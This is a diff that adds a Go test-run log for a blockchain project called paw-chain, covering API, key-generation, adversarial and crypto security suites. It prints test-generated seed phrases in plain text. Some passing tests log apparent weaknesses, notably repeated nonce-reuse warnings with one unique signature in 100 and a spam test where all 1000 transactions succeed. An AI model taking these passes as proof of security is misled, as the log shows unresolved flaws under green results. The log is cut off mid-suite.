@@ -1,0 +1,883 @@
+WARNING:(ast) sonic only supports go1.17~1.23, but your environment is not suitable
+=== RUN   TestHealthCheck
+[32m[200][0m 2025/11/16 14:57:32 |            0s |                 | GET     /health
+--- PASS: TestHealthCheck (0.00s)
+=== RUN   TestUserRegistration
+=== RUN   TestUserRegistration/successful_registration
+[32m[201][0m 2025/11/16 14:57:32 |     95.5552ms |                 | POST    /api/auth/register
+=== RUN   TestUserRegistration/username_too_short
+[33m[400][0m 2025/11/16 14:57:32 |            0s |                 | POST    /api/auth/register
+=== RUN   TestUserRegistration/password_too_short
+[33m[400][0m 2025/11/16 14:57:32 |            0s |                 | POST    /api/auth/register
+--- PASS: TestUserRegistration (0.10s)
+    --- PASS: TestUserRegistration/successful_registration (0.10s)
+    --- PASS: TestUserRegistration/username_too_short (0.00s)
+    --- PASS: TestUserRegistration/password_too_short (0.00s)
+=== RUN   TestUserLogin
+[32m[201][0m 2025/11/16 14:57:32 |     96.6045ms |                 | POST    /api/auth/register
+[32m[200][0m 2025/11/16 14:57:32 |     92.7674ms |                 | POST    /api/auth/login
+--- PASS: TestUserLogin (0.19s)
+=== RUN   TestOrderCreation
+[32m[201][0m 2025/11/16 14:57:32 |     70.2804ms |                 | POST    /api/auth/register
+[32m[200][0m 2025/11/16 14:57:32 |      66.867ms |                 | POST    /api/auth/login
+[32m[201][0m 2025/11/16 14:57:32 |       331.7µs |                 | POST    /api/orders/create
+--- PASS: TestOrderCreation (0.14s)
+=== RUN   TestGetOrderBook
+[32m[200][0m 2025/11/16 14:57:32 |       503.7µs |                 | GET     /api/orders/book
+--- PASS: TestGetOrderBook (0.00s)
+=== RUN   TestWalletBalance
+[32m[201][0m 2025/11/16 14:57:33 |     69.6662ms |                 | POST    /api/auth/register
+[32m[200][0m 2025/11/16 14:57:33 |     70.4549ms |                 | POST    /api/auth/login
+[32m[200][0m 2025/11/16 14:57:33 |            0s |                 | GET     /api/wallet/balance
+--- PASS: TestWalletBalance (0.14s)
+=== RUN   TestAtomicSwapPrepare
+[32m[201][0m 2025/11/16 14:57:33 |     74.1834ms |                 | POST    /api/auth/register
+[32m[200][0m 2025/11/16 14:57:33 |     71.9406ms |                 | POST    /api/auth/login
+[32m[201][0m 2025/11/16 14:57:33 |       524.2µs |                 | POST    /api/atomic-swap/prepare
+--- PASS: TestAtomicSwapPrepare (0.15s)
+=== RUN   TestGetPools
+[32m[200][0m 2025/11/16 14:57:33 |            0s |                 | GET     /api/pools
+--- PASS: TestGetPools (0.00s)
+=== RUN   TestAuthMiddleware
+[33m[401][0m 2025/11/16 14:57:33 |            0s |                 | GET     /api/wallet/balance
+[33m[401][0m 2025/11/16 14:57:33 |            0s |                 | GET     /api/wallet/balance
+[32m[201][0m 2025/11/16 14:57:33 |     68.9924ms |                 | POST    /api/auth/register
+[32m[200][0m 2025/11/16 14:57:33 |     65.8437ms |                 | POST    /api/auth/login
+[32m[200][0m 2025/11/16 14:57:33 |            0s |                 | GET     /api/wallet/balance
+--- PASS: TestAuthMiddleware (0.14s)
+=== RUN   TestDefaultRateLimitConfig
+--- PASS: TestDefaultRateLimitConfig (0.00s)
+=== RUN   TestConfigValidation
+=== RUN   TestConfigValidation/valid_config
+=== RUN   TestConfigValidation/invalid_default_rps
+=== RUN   TestConfigValidation/invalid_default_burst
+=== RUN   TestConfigValidation/invalid_endpoint_rps
+--- PASS: TestConfigValidation (0.00s)
+    --- PASS: TestConfigValidation/valid_config (0.00s)
+    --- PASS: TestConfigValidation/invalid_default_rps (0.00s)
+    --- PASS: TestConfigValidation/invalid_default_burst (0.00s)
+    --- PASS: TestConfigValidation/invalid_endpoint_rps (0.00s)
+=== RUN   TestNewAdvancedRateLimiter
+--- PASS: TestNewAdvancedRateLimiter (0.00s)
+=== RUN   TestIPBasedRateLimiting
+--- PASS: TestIPBasedRateLimiting (0.00s)
+=== RUN   TestEndpointSpecificRateLimiting
+--- PASS: TestEndpointSpecificRateLimiting (0.00s)
+=== RUN   TestAccountBasedRateLimiting
+--- PASS: TestAccountBasedRateLimiting (0.05s)
+=== RUN   TestIPWhitelisting
+--- PASS: TestIPWhitelisting (0.00s)
+=== RUN   TestIPBlacklisting
+--- PASS: TestIPBlacklisting (0.00s)
+=== RUN   TestAdaptiveRateLimiting
+--- PASS: TestAdaptiveRateLimiting (0.00s)
+=== RUN   TestAutoIPBlocking
+--- PASS: TestAutoIPBlocking (1.45s)
+=== RUN   TestRateLimitHeaders
+--- PASS: TestRateLimitHeaders (0.00s)
+=== RUN   TestConcurrentAccess
+--- PASS: TestConcurrentAccess (0.00s)
+=== RUN   TestCleanupRoutine
+--- PASS: TestCleanupRoutine (0.20s)
+=== RUN   TestGetStats
+--- PASS: TestGetStats (0.00s)
+=== RUN   TestGetEndpointLimit
+--- PASS: TestGetEndpointLimit (0.00s)
+=== RUN   TestGetTierLimit
+--- PASS: TestGetTierLimit (0.00s)
+PASS
+ok  	github.com/paw-chain/paw/api	(cached)
+?   	github.com/paw-chain/paw/api/cmd	[no test files]
+?   	github.com/paw-chain/paw/api/health	[no test files]
+WARNING:(ast) sonic only supports go1.17~1.23, but your environment is not suitable
+=== RUN   TestAppTestSuite
+=== RUN   TestAppTestSuite/TestComputeModuleIntegration
+    app_test.go:150: Waiting for compute keeper methods implementation
+=== RUN   TestAppTestSuite/TestDexModuleIntegration
+=== RUN   TestAppTestSuite/TestOracleModuleIntegration
+    app_test.go:171: Waiting for oracle keeper methods implementation
+--- PASS: TestAppTestSuite (0.08s)
+    --- SKIP: TestAppTestSuite/TestComputeModuleIntegration (0.04s)
+    --- PASS: TestAppTestSuite/TestDexModuleIntegration (0.01s)
+    --- SKIP: TestAppTestSuite/TestOracleModuleIntegration (0.03s)
+=== RUN   TestNewApp
+--- PASS: TestNewApp (0.00s)
+=== RUN   TestAppModules
+    app_test.go:61: TODO: Add public accessor method for ModuleManager in PAWApp
+--- SKIP: TestAppModules (0.00s)
+=== RUN   TestExportAppStateAndValidators
+--- PASS: TestExportAppStateAndValidators (0.02s)
+=== RUN   TestModuleAccountsExist
+--- PASS: TestModuleAccountsExist (0.02s)
+PASS
+ok  	github.com/paw-chain/paw/app	(cached)
+?   	github.com/paw-chain/paw/cmd/pawcli	[no test files]
+?   	github.com/paw-chain/paw/cmd/pawd	[no test files]
+WARNING:(ast) sonic only supports go1.17~1.23, but your environment is not suitable
+=== RUN   TestGenerateMnemonic12Words
+--- PASS: TestGenerateMnemonic12Words (0.00s)
+=== RUN   TestGenerateMnemonic24Words
+--- PASS: TestGenerateMnemonic24Words (0.00s)
+=== RUN   TestMnemonicValidation
+=== RUN   TestMnemonicValidation/valid_12-word_mnemonic
+=== RUN   TestMnemonicValidation/valid_24-word_mnemonic
+=== RUN   TestMnemonicValidation/invalid_checksum
+=== RUN   TestMnemonicValidation/wrong_word_count
+=== RUN   TestMnemonicValidation/invalid_word
+=== RUN   TestMnemonicValidation/empty_mnemonic
+--- PASS: TestMnemonicValidation (0.00s)
+    --- PASS: TestMnemonicValidation/valid_12-word_mnemonic (0.00s)
+    --- PASS: TestMnemonicValidation/valid_24-word_mnemonic (0.00s)
+    --- PASS: TestMnemonicValidation/invalid_checksum (0.00s)
+    --- PASS: TestMnemonicValidation/wrong_word_count (0.00s)
+    --- PASS: TestMnemonicValidation/invalid_word (0.00s)
+    --- PASS: TestMnemonicValidation/empty_mnemonic (0.00s)
+=== RUN   TestEntropyGeneration
+--- PASS: TestEntropyGeneration (0.00s)
+=== RUN   TestKeyDerivationConsistency
+--- PASS: TestKeyDerivationConsistency (0.01s)
+=== RUN   TestHDPathDifferentiation
+--- PASS: TestHDPathDifferentiation (0.00s)
+=== RUN   TestAddKeyCommand12Words
+--- PASS: TestAddKeyCommand12Words (0.03s)
+=== RUN   TestAddKeyCommand24Words
+--- PASS: TestAddKeyCommand24Words (0.03s)
+=== RUN   TestAddKeyCommandInvalidLength
+--- PASS: TestAddKeyCommandInvalidLength (0.00s)
+=== RUN   TestRecoverKeyCommand
+--- PASS: TestRecoverKeyCommand (0.03s)
+=== RUN   TestRecoverKeyConsistency
+--- PASS: TestRecoverKeyConsistency (0.02s)
+=== RUN   TestListKeysCommand
+--- PASS: TestListKeysCommand (0.04s)
+=== RUN   TestMnemonicBackupWarning
+--- PASS: TestMnemonicBackupWarning (0.01s)
+=== RUN   TestExportImportKey
+--- PASS: TestExportImportKey (0.08s)
+=== RUN   TestStandalone_GenerateMnemonic12Words
+    mnemonic_standalone_test.go:34: Generated 12-word mnemonic: opera normal tone fuel bone curve expand boy inch devote alley because
+--- PASS: TestStandalone_GenerateMnemonic12Words (0.00s)
+=== RUN   TestStandalone_GenerateMnemonic24Words
+    mnemonic_standalone_test.go:56: Generated 24-word mnemonic: winner youth blur fault dial rabbit float belt math shoot baby fun only note shove toilet mango color match flame museum dream canvas distance
+--- PASS: TestStandalone_GenerateMnemonic24Words (0.00s)
+=== RUN   TestStandalone_MnemonicValidation
+=== RUN   TestStandalone_MnemonicValidation/valid_12-word_mnemonic
+=== RUN   TestStandalone_MnemonicValidation/valid_24-word_mnemonic
+=== RUN   TestStandalone_MnemonicValidation/invalid_checksum
+=== RUN   TestStandalone_MnemonicValidation/wrong_word_count
+=== RUN   TestStandalone_MnemonicValidation/invalid_word
+=== RUN   TestStandalone_MnemonicValidation/empty_mnemonic
+--- PASS: TestStandalone_MnemonicValidation (0.00s)
+    --- PASS: TestStandalone_MnemonicValidation/valid_12-word_mnemonic (0.00s)
+    --- PASS: TestStandalone_MnemonicValidation/valid_24-word_mnemonic (0.00s)
+    --- PASS: TestStandalone_MnemonicValidation/invalid_checksum (0.00s)
+    --- PASS: TestStandalone_MnemonicValidation/wrong_word_count (0.00s)
+    --- PASS: TestStandalone_MnemonicValidation/invalid_word (0.00s)
+    --- PASS: TestStandalone_MnemonicValidation/empty_mnemonic (0.00s)
+=== RUN   TestStandalone_EntropyGeneration
+    mnemonic_standalone_test.go:137: Successfully generated 100 unique entropy samples
+--- PASS: TestStandalone_EntropyGeneration (0.00s)
+=== RUN   TestStandalone_DeterministicMnemonic
+    mnemonic_standalone_test.go:157: Deterministic mnemonic: abandon amount liar amount expire adjust cage candy arch gather drum buyer
+--- PASS: TestStandalone_DeterministicMnemonic (0.00s)
+=== RUN   TestStandalone_EntropyToSeed
+    mnemonic_standalone_test.go:173: Seed length: 64 bytes
+--- PASS: TestStandalone_EntropyToSeed (0.00s)
+=== RUN   TestStandalone_DifferentMnemonicsDifferentSeeds
+--- PASS: TestStandalone_DifferentMnemonicsDifferentSeeds (0.00s)
+=== RUN   TestStandalone_MnemonicWithPassphrase
+--- PASS: TestStandalone_MnemonicWithPassphrase (0.00s)
+=== RUN   TestStandalone_CompleteWorkflow
+    mnemonic_standalone_test.go:237: Step 1: Generated 32 bytes of entropy
+    mnemonic_standalone_test.go:243: Step 2: Generated mnemonic with 24 words
+    mnemonic_standalone_test.go:248: Step 3: Mnemonic validated successfully
+    mnemonic_standalone_test.go:253: Step 4: Generated 64-byte seed from mnemonic
+    mnemonic_standalone_test.go:258: Step 5: Recovery verified - same mnemonic produces identical seed
+--- PASS: TestStandalone_CompleteWorkflow (0.00s)
+=== RUN   TestStandalone_WordlistAccess
+    mnemonic_standalone_test.go:273: BIP39 wordlist is functional - generated valid mnemonic: rare note edge torch zebra quote bird never century point urban brave body ridge festival gate month deer valve slush desk cost patch topple
+--- PASS: TestStandalone_WordlistAccess (0.00s)
+PASS
+ok  	github.com/paw-chain/paw/cmd/pawd/cmd	0.544s
+?   	github.com/paw-chain/paw/external/crypto/exchange-frontend/node_modules/snyk/dist/gosrc	[no test files]
+?   	github.com/paw-chain/paw/p2p	[no test files]
+?   	github.com/paw-chain/paw/p2p/discovery	[no test files]
+?   	github.com/paw-chain/paw/p2p/protocol	[no test files]
+?   	github.com/paw-chain/paw/p2p/reputation	[no test files]
+?   	github.com/paw-chain/paw/security	[no test files]
+?   	github.com/paw-chain/paw/simapp	[no test files]
+WARNING:(ast) sonic only supports go1.17~1.23, but your environment is not suitable
+testing: warning: no tests to run
+PASS
+ok  	github.com/paw-chain/paw/tests/benchmarks	(cached) [no tests to run]
+WARNING:(ast) sonic only supports go1.17~1.23, but your environment is not suitable
+=== RUN   TestCometMockE2ETestSuite
+    cometmock_test.go:187: Skipping CometMock E2E tests - set USE_COMETMOCK=true to run
+--- SKIP: TestCometMockE2ETestSuite (0.00s)
+=== RUN   TestE2ETestSuite
+=== RUN   TestE2ETestSuite/TestComputeWorkflow
+    e2e_test.go:145: TODO: Implement RegisterProvider, RequestCompute, SubmitResult, and GetRequest methods in compute keeper
+=== RUN   TestE2ETestSuite/TestCrossModuleInteraction
+    e2e_test.go:226: TODO: Implement oracle keeper methods before testing cross-module interaction
+=== RUN   TestE2ETestSuite/TestDEXFullWorkflow
+=== RUN   TestE2ETestSuite/TestOracleWorkflow
+    e2e_test.go:186: TODO: Implement RegisterOracle, SubmitPrice, and GetPrice methods in oracle keeper
+--- PASS: TestE2ETestSuite (0.04s)
+    --- SKIP: TestE2ETestSuite/TestComputeWorkflow (0.00s)
+    --- SKIP: TestE2ETestSuite/TestCrossModuleInteraction (0.00s)
+    --- PASS: TestE2ETestSuite/TestDEXFullWorkflow (0.00s)
+    --- SKIP: TestE2ETestSuite/TestOracleWorkflow (0.00s)
+PASS
+ok  	github.com/paw-chain/paw/tests/e2e	(cached)
+=== RUN   TestPropertyPoolCreationCommutative
+--- PASS: TestPropertyPoolCreationCommutative (0.00s)
+=== RUN   TestPropertySwapNeverIncreasesReserves
+--- PASS: TestPropertySwapNeverIncreasesReserves (0.00s)
+=== RUN   TestPropertyAddRemoveLiquidityRoundtrip
+--- PASS: TestPropertyAddRemoveLiquidityRoundtrip (0.00s)
+=== RUN   TestPropertyPriceImpactIncreasesWithSize
+--- PASS: TestPropertyPriceImpactIncreasesWithSize (0.00s)
+=== RUN   TestPropertySwapAggregation
+--- PASS: TestPropertySwapAggregation (0.00s)
+=== RUN   TestPropertyReservesStayPositive
+--- PASS: TestPropertyReservesStayPositive (0.02s)
+=== RUN   TestPropertyKNeverDecreases
+--- PASS: TestPropertyKNeverDecreases (0.00s)
+PASS
+ok  	github.com/paw-chain/paw/tests/property	(cached)
+WARNING:(ast) sonic only supports go1.17~1.23, but your environment is not suitable
+=== RUN   TestAdversarialTestSuite
+=== RUN   TestAdversarialTestSuite/TestCensorship_Resistance
+    adversarial_test.go:523: Censorship resistance test - decentralization is key
+=== RUN   TestAdversarialTestSuite/TestDoubleSpending_Prevention
+=== RUN   TestAdversarialTestSuite/TestEclipseAttack
+    adversarial_test.go:472: Eclipse attack test - network diversity required
+=== RUN   TestAdversarialTestSuite/TestFlashLoan_Attack
+=== RUN   TestAdversarialTestSuite/TestFrontRunning_Simulation
+    adversarial_test.go:155: Victim received 36880
+=== RUN   TestAdversarialTestSuite/TestGriefing_ResourceExhaustion
+    adversarial_test.go:399: Griefing protection: Duplicate pools are prevented
+=== RUN   TestAdversarialTestSuite/TestLongRangeAttack
+    adversarial_test.go:357: Long-range attack simulation - checkpoints needed
+=== RUN   TestAdversarialTestSuite/TestOracleManipulation
+    adversarial_test.go:282: Oracle manipulation test - system requires active validators for price submission
+=== RUN   TestAdversarialTestSuite/TestReplayAttack
+    adversarial_test.go:451: Replay attack test - sequence numbers provide protection
+=== RUN   TestAdversarialTestSuite/TestSandwichAttack_Detection
+    adversarial_test.go:243: Sandwich attack sequence completed - mitigation strategies needed
+=== RUN   TestAdversarialTestSuite/TestSelfish_Mining
+    adversarial_test.go:492: Selfish mining test - BFT consensus provides protection
+=== RUN   TestAdversarialTestSuite/TestSybilAttack
+    adversarial_test.go:294: Sybil resistance: Oracle system requires validators with stake
+=== RUN   TestAdversarialTestSuite/TestTimeBandits
+--- PASS: TestAdversarialTestSuite (0.32s)
+    --- PASS: TestAdversarialTestSuite/TestCensorship_Resistance (0.07s)
+    --- PASS: TestAdversarialTestSuite/TestDoubleSpending_Prevention (0.02s)
+    --- PASS: TestAdversarialTestSuite/TestEclipseAttack (0.02s)
+    --- PASS: TestAdversarialTestSuite/TestFlashLoan_Attack (0.04s)
+    --- PASS: TestAdversarialTestSuite/TestFrontRunning_Simulation (0.03s)
+    --- PASS: TestAdversarialTestSuite/TestGriefing_ResourceExhaustion (0.01s)
+    --- PASS: TestAdversarialTestSuite/TestLongRangeAttack (0.03s)
+    --- PASS: TestAdversarialTestSuite/TestOracleManipulation (0.01s)
+    --- PASS: TestAdversarialTestSuite/TestReplayAttack (0.02s)
+    --- PASS: TestAdversarialTestSuite/TestSandwichAttack_Detection (0.03s)
+    --- PASS: TestAdversarialTestSuite/TestSelfish_Mining (0.01s)
+    --- PASS: TestAdversarialTestSuite/TestSybilAttack (0.02s)
+    --- PASS: TestAdversarialTestSuite/TestTimeBandits (0.01s)
+=== RUN   TestAuthSecurityTestSuite
+=== RUN   TestAuthSecurityTestSuite/TestAccessControl_ComputeProviderRegistration
+=== RUN   TestAuthSecurityTestSuite/TestAccessControl_OracleSubmission
+=== RUN   TestAuthSecurityTestSuite/TestAuthenticationBypass_InvalidSignature
+=== RUN   TestAuthSecurityTestSuite/TestAuthorizationEscalation_CrossModuleAccess
+=== RUN   TestAuthSecurityTestSuite/TestAuthorizationEscalation_ModuleAccountAccess
+=== RUN   TestAuthSecurityTestSuite/TestDenialOfService_ResourceExhaustion
+    auth_test.go:381: Created 1 pools before hitting limits
+=== RUN   TestAuthSecurityTestSuite/TestPermissionEscalation_UnauthorizedPoolCreation
+=== RUN   TestAuthSecurityTestSuite/TestPrivilegeEscalation_GovernanceBypass
+=== RUN   TestAuthSecurityTestSuite/TestRateLimiting_TransactionSpam
+    auth_test.go:186: Successfully executed 1000 out of 1000 transactions
+=== RUN   TestAuthSecurityTestSuite/TestReentrancy_DEXSwap
+=== RUN   TestAuthSecurityTestSuite/TestSessionManagement_StaleContext
+=== RUN   TestAuthSecurityTestSuite/TestTimeBasedAttacks_TimestampManipulation
+--- PASS: TestAuthSecurityTestSuite (2.00s)
+    --- PASS: TestAuthSecurityTestSuite/TestAccessControl_ComputeProviderRegistration (0.02s)
+    --- PASS: TestAuthSecurityTestSuite/TestAccessControl_OracleSubmission (0.02s)
+    --- PASS: TestAuthSecurityTestSuite/TestAuthenticationBypass_InvalidSignature (0.01s)
+    --- PASS: TestAuthSecurityTestSuite/TestAuthorizationEscalation_CrossModuleAccess (0.01s)
+    --- PASS: TestAuthSecurityTestSuite/TestAuthorizationEscalation_ModuleAccountAccess (0.02s)
+    --- PASS: TestAuthSecurityTestSuite/TestDenialOfService_ResourceExhaustion (0.01s)
+    --- PASS: TestAuthSecurityTestSuite/TestPermissionEscalation_UnauthorizedPoolCreation (0.02s)
+    --- PASS: TestAuthSecurityTestSuite/TestPrivilegeEscalation_GovernanceBypass (0.01s)
+    --- PASS: TestAuthSecurityTestSuite/TestRateLimiting_TransactionSpam (1.85s)
+    --- PASS: TestAuthSecurityTestSuite/TestReentrancy_DEXSwap (0.01s)
+    --- PASS: TestAuthSecurityTestSuite/TestSessionManagement_StaleContext (0.01s)
+    --- PASS: TestAuthSecurityTestSuite/TestTimeBasedAttacks_TimestampManipulation (0.01s)
+=== RUN   TestCryptoSecurityTestSuite
+=== RUN   TestCryptoSecurityTestSuite/TestAddressGeneration_Consistency
+=== RUN   TestCryptoSecurityTestSuite/TestBIP32_HDKeyDerivation
+=== RUN   TestCryptoSecurityTestSuite/TestBIP32_HDKeyDerivation/First_address
+=== RUN   TestCryptoSecurityTestSuite/TestBIP32_HDKeyDerivation/Second_address
+=== RUN   TestCryptoSecurityTestSuite/TestBIP32_HDKeyDerivation/Third_address
+=== RUN   TestCryptoSecurityTestSuite/TestBIP32_HDKeyDerivation/High_index
+=== RUN   TestCryptoSecurityTestSuite/TestBIP39_InvalidMnemonics
+=== RUN   TestCryptoSecurityTestSuite/TestBIP39_InvalidMnemonics/Invalid_\x00
+=== RUN   TestCryptoSecurityTestSuite/TestBIP39_InvalidMnemonics/Invalid_\x01
+=== RUN   TestCryptoSecurityTestSuite/TestBIP39_InvalidMnemonics/Invalid_\x02
+=== RUN   TestCryptoSecurityTestSuite/TestBIP39_InvalidMnemonics/Invalid_\x03
+=== RUN   TestCryptoSecurityTestSuite/TestBIP39_InvalidMnemonics/Invalid_\x04
+=== RUN   TestCryptoSecurityTestSuite/TestBIP39_MnemonicGeneration
+=== RUN   TestCryptoSecurityTestSuite/TestBIP39_MnemonicGeneration/Entropy_\u0080
+=== RUN   TestCryptoSecurityTestSuite/TestBIP39_MnemonicGeneration/Entropy__
+=== RUN   TestCryptoSecurityTestSuite/TestBIP39_MnemonicGeneration/Entropy_À
+=== RUN   TestCryptoSecurityTestSuite/TestBIP39_MnemonicGeneration/Entropy_à
+=== RUN   TestCryptoSecurityTestSuite/TestBIP39_MnemonicGeneration/Entropy_Ā
+=== RUN   TestCryptoSecurityTestSuite/TestCryptographicPrimitives_Standards
+=== RUN   TestCryptoSecurityTestSuite/TestEntropy_Randomness
+=== RUN   TestCryptoSecurityTestSuite/TestHashCollision_Resistance
+=== RUN   TestCryptoSecurityTestSuite/TestKeyGeneration_Secp256k1
+=== RUN   TestCryptoSecurityTestSuite/TestKeyRecovery_Prevention
+=== RUN   TestCryptoSecurityTestSuite/TestNonceReuse_Prevention
+    crypto_test.go:472: Warning: Duplicate signature detected (nonce reuse)
+    crypto_test.go:472: Warning: Duplicate signature detected (nonce reuse)
+    crypto_test.go:472: Warning: Duplicate signature detected (nonce reuse)
+    crypto_test.go:472: Warning: Duplicate signature detected (nonce reuse)
+    crypto_test.go:472: Warning: Duplicate signature detected (nonce reuse)
+    crypto_test.go:472: Warning: Duplicate signature detected (nonce reuse)
+    crypto_test.go:472: Warning: Duplicate signature detected (nonce reuse)
+    crypto_test.go:472: Warning: Duplicate signature detected (nonce reuse)
+    crypto_test.go:472: Warning: Duplicate signature detected (nonce reuse)
+    crypto_test.go:472: Warning: Duplicate signature detected (nonce reuse)
+    crypto_test.go:472: Warning: Duplicate signature detected (nonce reuse)
+    crypto_test.go:472: Warning: Duplicate signature detected (nonce reuse)
+    crypto_test.go:472: Warning: Duplicate signature detected (nonce reuse)
+    crypto_test.go:472: Warning: Duplicate signature detected (nonce reuse)
+    crypto_test.go:472: Warning: Duplicate signature detected (nonce reuse)
+    crypto_test.go:472: Warning: Duplicate signature detected (nonce reuse)
+    crypto_test.go:472: Warning: Duplicate signature detected (nonce reuse)
+    crypto_test.go:472: Warning: Duplicate signature detected (nonce reuse)
+    crypto_test.go:472: Warning: Duplicate signature detected (nonce reuse)
+    crypto_test.go:472: Warning: Duplicate signature detected (nonce reuse)
+    crypto_test.go:472: Warning: Duplicate signature detected (nonce reuse)
+    crypto_test.go:472: Warning: Duplicate signature detected (nonce reuse)
+    crypto_test.go:472: Warning: Duplicate signature detected (nonce reuse)
+    crypto_test.go:472: Warning: Duplicate signature detected (nonce reuse)
+    crypto_test.go:472: Warning: Duplicate signature detected (nonce reuse)
+    crypto_test.go:472: Warning: Duplicate signature detected (nonce reuse)
+    crypto_test.go:472: Warning: Duplicate signature detected (nonce reuse)
+    crypto_test.go:472: Warning: Duplicate signature detected (nonce reuse)
+    crypto_test.go:472: Warning: Duplicate signature detected (nonce reuse)
+    crypto_test.go:472: Warning: Duplicate signature detected (nonce reuse)
+    crypto_test.go:472: Warning: Duplicate signature detected (nonce reuse)
+    crypto_test.go:472: Warning: Duplicate signature detected (nonce reuse)
+    crypto_test.go:472: Warning: Duplicate signature detected (nonce reuse)
+    crypto_test.go:472: Warning: Duplicate signature detected (nonce reuse)
+    crypto_test.go:472: Warning: Duplicate signature detected (nonce reuse)
+    crypto_test.go:472: Warning: Duplicate signature detected (nonce reuse)
+    crypto_test.go:472: Warning: Duplicate signature detected (nonce reuse)
+    crypto_test.go:472: Warning: Duplicate signature detected (nonce reuse)
+    crypto_test.go:472: Warning: Duplicate signature detected (nonce reuse)
+    crypto_test.go:472: Warning: Duplicate signature detected (nonce reuse)
+    crypto_test.go:472: Warning: Duplicate signature detected (nonce reuse)
+    crypto_test.go:472: Warning: Duplicate signature detected (nonce reuse)
+    crypto_test.go:472: Warning: Duplicate signature detected (nonce reuse)
+    crypto_test.go:472: Warning: Duplicate signature detected (nonce reuse)
+    crypto_test.go:472: Warning: Duplicate signature detected (nonce reuse)
+    crypto_test.go:472: Warning: Duplicate signature detected (nonce reuse)
+    crypto_test.go:472: Warning: Duplicate signature detected (nonce reuse)
+    crypto_test.go:472: Warning: Duplicate signature detected (nonce reuse)
+    crypto_test.go:472: Warning: Duplicate signature detected (nonce reuse)
+    crypto_test.go:472: Warning: Duplicate signature detected (nonce reuse)
+    crypto_test.go:472: Warning: Duplicate signature detected (nonce reuse)
+    crypto_test.go:472: Warning: Duplicate signature detected (nonce reuse)
+    crypto_test.go:472: Warning: Duplicate signature detected (nonce reuse)
+    crypto_test.go:472: Warning: Duplicate signature detected (nonce reuse)
+    crypto_test.go:472: Warning: Duplicate signature detected (nonce reuse)
+    crypto_test.go:472: Warning: Duplicate signature detected (nonce reuse)
+    crypto_test.go:472: Warning: Duplicate signature detected (nonce reuse)
+    crypto_test.go:472: Warning: Duplicate signature detected (nonce reuse)
+    crypto_test.go:472: Warning: Duplicate signature detected (nonce reuse)
+    crypto_test.go:472: Warning: Duplicate signature detected (nonce reuse)
+    crypto_test.go:472: Warning: Duplicate signature detected (nonce reuse)
+    crypto_test.go:472: Warning: Duplicate signature detected (nonce reuse)
+    crypto_test.go:472: Warning: Duplicate signature detected (nonce reuse)
+    crypto_test.go:472: Warning: Duplicate signature detected (nonce reuse)
+    crypto_test.go:472: Warning: Duplicate signature detected (nonce reuse)
+    crypto_test.go:472: Warning: Duplicate signature detected (nonce reuse)
+    crypto_test.go:472: Warning: Duplicate signature detected (nonce reuse)
+    crypto_test.go:472: Warning: Duplicate signature detected (nonce reuse)
+    crypto_test.go:472: Warning: Duplicate signature detected (nonce reuse)
+    crypto_test.go:472: Warning: Duplicate signature detected (nonce reuse)
+    crypto_test.go:472: Warning: Duplicate signature detected (nonce reuse)
+    crypto_test.go:472: Warning: Duplicate signature detected (nonce reuse)
+    crypto_test.go:472: Warning: Duplicate signature detected (nonce reuse)
+    crypto_test.go:472: Warning: Duplicate signature detected (nonce reuse)
+    crypto_test.go:472: Warning: Duplicate signature detected (nonce reuse)
+    crypto_test.go:472: Warning: Duplicate signature detected (nonce reuse)
+    crypto_test.go:472: Warning: Duplicate signature detected (nonce reuse)
+    crypto_test.go:472: Warning: Duplicate signature detected (nonce reuse)
+    crypto_test.go:472: Warning: Duplicate signature detected (nonce reuse)
+    crypto_test.go:472: Warning: Duplicate signature detected (nonce reuse)
+    crypto_test.go:472: Warning: Duplicate signature detected (nonce reuse)
+    crypto_test.go:472: Warning: Duplicate signature detected (nonce reuse)
+    crypto_test.go:472: Warning: Duplicate signature detected (nonce reuse)
+    crypto_test.go:472: Warning: Duplicate signature detected (nonce reuse)
+    crypto_test.go:472: Warning: Duplicate signature detected (nonce reuse)
+    crypto_test.go:472: Warning: Duplicate signature detected (nonce reuse)
+    crypto_test.go:472: Warning: Duplicate signature detected (nonce reuse)
+    crypto_test.go:472: Warning: Duplicate signature detected (nonce reuse)
+    crypto_test.go:472: Warning: Duplicate signature detected (nonce reuse)
+    crypto_test.go:472: Warning: Duplicate signature detected (nonce reuse)
+    crypto_test.go:472: Warning: Duplicate signature detected (nonce reuse)
+    crypto_test.go:472: Warning: Duplicate signature detected (nonce reuse)
+    crypto_test.go:472: Warning: Duplicate signature detected (nonce reuse)
+    crypto_test.go:472: Warning: Duplicate signature detected (nonce reuse)
+    crypto_test.go:472: Warning: Duplicate signature detected (nonce reuse)
+    crypto_test.go:472: Warning: Duplicate signature detected (nonce reuse)
+    crypto_test.go:472: Warning: Duplicate signature detected (nonce reuse)
+    crypto_test.go:472: Warning: Duplicate signature detected (nonce reuse)
+    crypto_test.go:472: Warning: Duplicate signature detected (nonce reuse)
+    crypto_test.go:478: Generated 1 unique signatures out of 100 attempts
+=== RUN   TestCryptoSecurityTestSuite/TestSignature_Verification
+=== RUN   TestCryptoSecurityTestSuite/TestSignature_Verification/Short_message
+=== RUN   TestCryptoSecurityTestSuite/TestSignature_Verification/Medium_message
+=== RUN   TestCryptoSecurityTestSuite/TestSignature_Verification/Long_message
+=== RUN   TestCryptoSecurityTestSuite/TestSignature_Verification/Empty_message
+=== RUN   TestCryptoSecurityTestSuite/TestTimingAttack_Resistance
+=== RUN   TestCryptoSecurityTestSuite/TestWeakKeys_Detection
+=== RUN   TestCryptoSecurityTestSuite/TestWeakKeys_Detection/Weak_entropy_\x00
+    crypto_test.go:329: Weak entropy detected: 0000000000000000
+=== RUN   TestCryptoSecurityTestSuite/TestWeakKeys_Detection/Weak_entropy_\x01
+=== RUN   TestCryptoSecurityTestSuite/TestWeakKeys_Detection/Weak_entropy_\x02
+=== RUN   TestCryptoSecurityTestSuite/TestWeakKeys_Detection/Weak_entropy_\x03
+=== RUN   TestCryptoSecurityTestSuite/TestWeakKeys_Detection/Weak_entropy_\x04
+=== RUN   TestCryptoSecurityTestSuite/TestWeakKeys_Detection/Weak_entropy_\x05
+=== RUN   TestCryptoSecurityTestSuite/TestWeakKeys_Detection/Weak_entropy_\x06
+--- PASS: TestCryptoSecurityTestSuite (0.64s)
+    --- PASS: TestCryptoSecurityTestSuite/TestAddressGeneration_Consistency (0.01s)
+    --- PASS: TestCryptoSecurityTestSuite/TestBIP32_HDKeyDerivation (0.02s)
+        --- PASS: TestCryptoSecurityTestSuite/TestBIP32_HDKeyDerivation/First_address (0.00s)
+        --- PASS: TestCryptoSecurityTestSuite/TestBIP32_HDKeyDerivation/Second_address (0.00s)
